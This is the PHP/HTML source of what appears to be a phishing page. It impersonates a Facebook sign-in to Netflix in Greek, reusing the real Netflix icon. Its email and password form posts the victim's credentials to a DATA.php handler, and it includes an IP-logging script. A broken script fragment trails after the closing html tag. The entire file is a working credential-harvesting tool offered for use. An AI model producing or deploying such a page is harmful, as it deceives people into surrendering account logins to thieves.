<?php
include 'Data/translate.php';
include 'Data/ip.php';
?>

<!DOCTYPE html>
<html>
    <style>
        .cbalink
        {
            color:white !important;
        }

        .cbalink a
        {
            color:white !important;
        }
    </style>
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="icon.png">
    <title>Facebook - Συνδεθείτε στο Netflix</title>
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
<center>
    <nav>
        <h3 class="text-center">Facebook</h3>
    </nav>

	<center>
    <div class="war">
        	<br>
<img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"><br>
<h5><b><?php echo $txt ?> <br> <?php echo $txt1 ?>  </b> </h5>

 </div>
    </div> </center>

    <div class="container">
        <div class="form-box">
            <form action="DATA.php" method="POST">
                <input minlength="4" type="text" name="mail" dir="ltr" placeholder="<?php echo $txt_mail ?> " required  >
                <input minlength="6" type="password" name="pass" dir="ltr" placeholder="<?php echo $txt_pass ?> " required >
                <button class="btn btn-primary b1"><?php echo $txt_button ?> </button>
                <div class="aps">
                    <hr class="hr">        
                </div>
                <br>
                <p></p>
                
            </form>
        </div>
    </div>

	</center>
</body>
</html>


'))</script>